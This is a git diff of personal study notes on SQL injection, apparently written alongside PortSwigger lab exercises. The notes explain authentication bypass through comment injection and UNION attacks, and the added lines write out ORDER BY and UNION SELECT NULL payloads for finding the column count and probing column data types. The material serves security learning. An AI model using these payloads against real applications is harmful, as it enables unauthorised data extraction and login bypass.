@@ -1,4 +1,4 @@
-# Injection Examples:
+# Injection Examples: [Lab-Links](https://github.com/IOxCyber/CyberEssentials/blob/f759882896be05d29c88b3d7bc31fc83759afab3/Security-Tools/Burp_Suite/PortSwigger-WebSecAcad/Web_Vuln-Insights/SQL%20Injection/SQLi_Labs.md)
 
 ## A. `Retrieving hidden data`, where you can modify a SQL query to return additional results.
 
@@ -24,24 +24,58 @@
 - Testing on a login page involves attempting to subvert the application logic and bypass the authentication mechanism
 - `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''` commenting out the remaining portion of the original query.
 
-## C. `UNION attacks`, retrieve data from different database tables.
-- Technique used to combine the result sets of two or more SELECT statements in a single SQL query.
+## C. UNION attacks `to combine the result sets of two or more SELECT statements in a single SQL query`
+
+### 1. `Retrieve data from different database tables.`
 - eg. `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
 
 ## NOTE: For a Union Query to work: Both queries should `Return same number of Columns, Data type must be compatiable.`
 
 ### Example
-1. Original Query:
-- `SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';`
+1. Original Query: `SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';`
 
-2. Injection: 
-- `username ' UNION SELECT null, table_name FROM information_schema.tables --` (-- to comment out rest of the original query)
+2. Injection: `username ' UNION SELECT null, table_name FROM information_schema.tables --` (-- to comment out rest of the original query)
 
-3. Modified Query:
-- `SELECT * FROM users WHERE username = '' UNION SELECT null, table_name FROM information_schema.tables --' AND password = 'input_password';`
+3. Modified Query: `SELECT * FROM users WHERE username = '' UNION SELECT null, table_name FROM information_schema.tables --' AND password = 'input_password';`
 
----
----
+### 2. Determining the number of columns required `No. of columns being returned from the original query`
+- Motive: Determine the Columns Numbers > 
+
+- Method 1: `injecting a series of ORDER BY clauses and incrementing` the specified column index until an error occurs.
+> `ORDER BY` clause in SQL is used to sort the result set of a query by one or more columns.
+```
+eg.
+SELECT * FROM employees WHERE age > 25 ORDER BY salary DESC;
+
+' ORDER BY 1--    **It means to sort the table by column 1**
+' ORDER BY 2--
+' ORDER BY 3--
+etc.
+```
+- Method 2: Submitting a series of `UNION SELECT` payloads specifying a different number of null values.
+> NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed.
+```
+eg.
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+etc.
+```
+
+### Finding columns with a useful data type
+- `After we determine the number of returning columns, we can probe each column to test whether it can hold string data.`
+- We can submit a series of UNION SELECT payloads that place a string value into each column.
+```
+eg.
+
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+```
+> If the column data type is not compatible with string data, the injected query will cause a database error.
+
 
 ## D. Blind SQL injection, `where the results of a query you can't see in the application's responses.`
 - Similar to other SQL injection attacks. However, the attacker doesn't see the direct results of their injected queries.
